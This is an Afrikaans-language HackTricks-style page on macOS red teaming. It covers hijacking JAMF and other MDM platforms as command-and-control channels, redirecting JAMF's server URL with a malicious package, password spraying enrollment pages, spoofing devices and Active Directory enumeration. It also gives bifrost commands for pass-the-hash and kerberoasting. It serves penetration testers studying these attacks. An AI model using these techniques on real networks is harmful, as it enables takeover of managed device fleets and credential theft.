# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Misbruik van MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

As jy daarin slaag om **administrateur akrediteer te kompromitteer** om toegang tot die bestuurplatform te verkry, kan jy **potensieel al die rekenaars kompromitteer** deur jou malware in die masjiene te versprei.

Vir red teaming in MacOS omgewings word dit sterk aanbeveel om 'n bietjie begrip te hê van hoe die MDMs werk:

{{#ref}}
macos-mdm/
{{#endref}}

### Gebruik MDM as 'n C2

'n MDM sal toestemming hê om profiele te installeer, te vra of te verwyder, toepassings te installeer, plaaslike administrateur rekeninge te skep, firmware wagwoord in te stel, die FileVault sleutel te verander...

Om jou eie MDM te laat loop, moet jy **jou CSR deur 'n verskaffer laat teken** wat jy kan probeer om te kry met [**https://mdmcert.download/**](https://mdmcert.download/). En om jou eie MDM vir Apple toestelle te laat loop, kan jy [**MicroMDM**](https://github.com/micromdm/micromdm) gebruik.

Om egter 'n toepassing op 'n geregistreerde toestel te installeer, moet dit steeds deur 'n ontwikkelaar rekening geteken wees... egter, by MDM registrasie voeg die **toestel die SSL sertifikaat van die MDM as 'n vertroude CA** by, sodat jy nou enigiets kan teken.

Om die toestel in 'n MDM te registreer, moet jy 'n **`mobileconfig`** lêer as root installeer, wat via 'n **pkg** lêer afgelewer kan word (jy kan dit in zip komprimeer en wanneer dit van safari afgelaai word, sal dit ontkoppel word).

**Mythic agent Orthrus** gebruik hierdie tegniek.

### Misbruik van JAMF PRO

JAMF kan **aangepaste skripte** (skripte wat deur die sysadmin ontwikkel is), **natuurlike payloads** (plaaslike rekening skepping, EFI wagwoord instel, lêer/proses monitering...) en **MDM** (toestel konfigurasies, toestel sertifikate...) uitvoer.

#### JAMF self-registrasie

Gaan na 'n bladsy soos `https://<company-name>.jamfcloud.com/enroll/` om te sien of hulle **self-registrasie geaktiveer** het. As hulle dit het, kan dit **om akrediteer vra om toegang te verkry**.

Jy kan die skrip [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) gebruik om 'n wagwoord spuit aanval uit te voer.

Boonop, nadat jy die regte akrediteer gevind het, kan jy in staat wees om ander gebruikersname met die volgende vorm te brute-force:

![](<../../images/image (107).png>)

#### JAMF toestel Verifikasie

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Die **`jamf`** binêre het die geheim bevat om die sleutelsak te open wat op die tydstip van die ontdekking **gedeel** was onder almal en dit was: **`jk23ucnq91jfu9aj`**.\
Boonop, jamf **bly** as 'n **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Toestel Oorneming

Die **JSS** (Jamf Software Server) **URL** wat **`jamf`** sal gebruik, is geleë in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Hierdie lêer bevat basies die URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
So, 'n aanvaller kan 'n kwaadwillige pakket (`pkg`) laat val wat **hierdie lêer oorskryf** wanneer dit geïnstalleer word, wat die **URL na 'n Mythic C2 listener van 'n Typhon agent** stel om nou JAMF as C2 te kan misbruik.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Vervalsing

Om die **kommunikasie** tussen 'n toestel en JMF te **verval** het jy nodig:

- Die **UUID** van die toestel: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Die **JAMF sleutelhouer** van: `/Library/Application\ Support/Jamf/JAMF.keychain` wat die toestel sertifikaat bevat

Met hierdie inligting, **skep 'n VM** met die **gestole** Hardeware **UUID** en met **SIP gedeaktiveer**, plaas die **JAMF sleutelhouer,** **haak** die Jamf **agent** en steel sy inligting.

#### Geheimste steel

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Jy kan ook die ligging `/Library/Application Support/Jamf/tmp/` monitor vir die **aangepaste skripte** wat admins mag wil uitvoer via Jamf, aangesien hulle **hier geplaas, uitgevoer en verwyder** word. Hierdie skripte **kan akrediteer** bevat.

Echter, **akrediteer** kan aan hierdie skripte as **parameters** oorgedra word, so jy sal `ps aux | grep -i jamf` moet monitor (sonder om eers root te wees).

Die skrip [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) kan luister vir nuwe lêers wat bygevoeg word en nuwe proses argumente.

### macOS Afgeleë Toegang

En ook oor **MacOS** "spesiale" **netwerk** **protokolle**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Aktiewe Gids

In sommige gevalle sal jy vind dat die **MacOS rekenaar aan 'n AD** gekoppel is. In hierdie scenario moet jy probeer om die aktiewe gids te **enumerate** soos jy gewoond is. Vind 'n bietjie **hulp** in die volgende bladsye:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Sommige **lokale MacOS hulpmiddel** wat jou ook kan help is `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Daar is ook 'n paar gereedskap voorberei vir MacOS om outomaties die AD te enumerate en met kerberos te speel:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound is 'n uitbreiding van die Bloodhound ouditgereedskap wat die versameling en opname van Active Directory verhoudings op MacOS gasheer toestelle moontlik maak.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost is 'n Objective-C projek wat ontwerp is om met die Heimdal krb5 APIs op macOS te kommunikeer. Die doel van die projek is om beter sekuriteitstoetsing rondom Kerberos op macOS toestelle moontlik te maak deur gebruik te maak van inheemse APIs sonder om enige ander raamwerk of pakkette op die teiken te vereis.
- [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) gereedskap om Active Directory te enumerate.

### Domein Inligting
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Gebruikers

Die drie tipes MacOS-gebruikers is:

- **Plaaslike Gebruikers** — Bestuur deur die plaaslike OpenDirectory-diens, hulle is nie op enige manier aan die Active Directory gekoppel nie.
- **Netwerk Gebruikers** — Vlugtige Active Directory-gebruikers wat 'n verbinding met die DC-bediener benodig om te autentiseer.
- **Mobiele Gebruikers** — Active Directory-gebruikers met 'n plaaslike rugsteun vir hul akrediteer en lêers.

Die plaaslike inligting oor gebruikers en groepe word gestoor in die gids _/var/db/dslocal/nodes/Default._\
Byvoorbeeld, die inligting oor die gebruiker genaamd _mark_ word gestoor in _/var/db/dslocal/nodes/Default/users/mark.plist_ en die inligting oor die groep _admin_ is in _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Benewens die gebruik van die HasSession en AdminTo kante, **voeg MacHound drie nuwe kante** by die Bloodhound-databasis:

- **CanSSH** - entiteit toegelaat om SSH na gasheer
- **CanVNC** - entiteit toegelaat om VNC na gasheer
- **CanAE** - entiteit toegelaat om AppleEvent-skripte op gasheer uit te voer
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Meer inligting in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ wagwoord

Kry wagwoorde met:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Dit is moontlik om die **`Computer$`** wagwoord binne die Stelsel sleutelhouer te verkry.

### Over-Pass-The-Hash

Kry 'n TGT vir 'n spesifieke gebruiker en diens:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Sodra die TGT versamel is, is dit moontlik om dit in die huidige sessie in te spuit met:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Met verkrygde dienskaartjies is dit moontlik om te probeer om toegang te verkry tot gedeeltes op ander rekenaars:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Toegang tot die Sleutelketting

Die Sleutelketing bevat hoogs waarskynlik sensitiewe inligting wat, indien toegang verkry word sonder om 'n prompt te genereer, kan help om 'n rooi span oefening vorentoe te beweeg:

{{#ref}}
macos-keychain.md
{{#endref}}

## Eksterne Dienste

MacOS Rooi Span is anders as 'n gewone Windows Rooi Span, aangesien **MacOS gewoonlik met verskeie eksterne platforms direk geïntegreer is**. 'n Algemene konfigurasie van MacOS is om toegang tot die rekenaar te verkry met **OneLogin gesinkroniseerde akrediteer, en toegang tot verskeie eksterne dienste** (soos github, aws...) via OneLogin.

## Verskeie Rooi Span tegnieke

### Safari

Wanneer 'n lêer in Safari afgelaai word, as dit 'n "veilige" lêer is, sal dit **outomaties geopen** word. So byvoorbeeld, as jy **'n zip aflaai**, sal dit outomaties uitgepak word:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Verwysings

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
